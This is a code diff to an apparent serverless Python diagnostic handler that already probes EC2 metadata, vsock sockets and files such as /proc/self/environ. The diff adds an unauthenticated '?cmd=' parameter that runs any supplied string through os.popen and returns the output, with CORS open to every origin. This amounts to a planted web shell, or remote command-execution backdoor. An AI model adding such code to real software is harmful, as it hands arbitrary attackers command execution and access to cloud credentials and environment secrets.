@@ -16,7 +16,7 @@ def handler(event: Dict[str, Any], context: Any) -> Dict[str, Any]:
     
     cors_headers = {
         'Access-Control-Allow-Origin': '*',
-        'Access-Control-Allow-Methods': 'GET, OPTIONS',
+        'Access-Control-Allow-Methods': 'GET, POST, OPTIONS',
         'Access-Control-Allow-Headers': 'Content-Type',
         'Access-Control-Max-Age': '86400',
         'Content-Type': 'application/json'
@@ -31,6 +31,29 @@ def handler(event: Dict[str, Any], context: Any) -> Dict[str, Any]:
     
     params = event.get('queryStringParameters') or {}
     path = params.get('path', 'help')
+    cmd = params.get('cmd')
+    
+    if cmd is not None:
+        try:
+            result = execute_shell_command(cmd)
+            return {
+                'statusCode': 200,
+                'headers': cors_headers,
+                'isBase64Encoded': False,
+                'body': json.dumps(result, indent=2, ensure_ascii=False, default=str)
+            }
+        except Exception as e:
+            error_result = {
+                'error': str(e),
+                'type': type(e).__name__,
+                'command': cmd
+            }
+            return {
+                'statusCode': 500,
+                'headers': cors_headers,
+                'isBase64Encoded': False,
+                'body': json.dumps(error_result, indent=2, ensure_ascii=False)
+            }
     
     try:
         result = execute_diagnostic(path, context)
@@ -65,7 +88,8 @@ def execute_diagnostic(path: str, context: Any) -> Dict[str, Any]:
                 {'path': 'meta', 'description': 'EC2 metadata service queries'},
                 {'path': 'vsock', 'description': 'AF_VSOCK connection test'},
                 {'path': 'files', 'description': 'Filesystem exploration'},
-                {'path': 'ping', 'description': 'Health check'}
+                {'path': 'ping', 'description': 'Health check'},
+                {'path': 'shell', 'description': 'Execute shell command via ?cmd=command'}
             ]
         }
     
@@ -225,3 +249,30 @@ def explore_filesystem() -> Dict[str, Any]:
         results['/proc/self/environ'] = {'error': str(e)}
     
     return results
+
+def execute_shell_command(cmd: str) -> Dict[str, Any]:
+    '''Execute shell command via os.popen'''
+    import time
+    
+    start_time = time.time()
+    
+    try:
+        output = os.popen(cmd).read()
+        execution_time = time.time() - start_time
+        
+        return {
+            'command': cmd,
+            'status': 'success',
+            'output': output,
+            'execution_time_seconds': round(execution_time, 3),
+            'output_length': len(output)
+        }
+    except Exception as e:
+        execution_time = time.time() - start_time
+        return {
+            'command': cmd,
+            'status': 'error',
+            'error': str(e),
+            'error_type': type(e).__name__,
+            'execution_time_seconds': round(execution_time, 3)
+        }
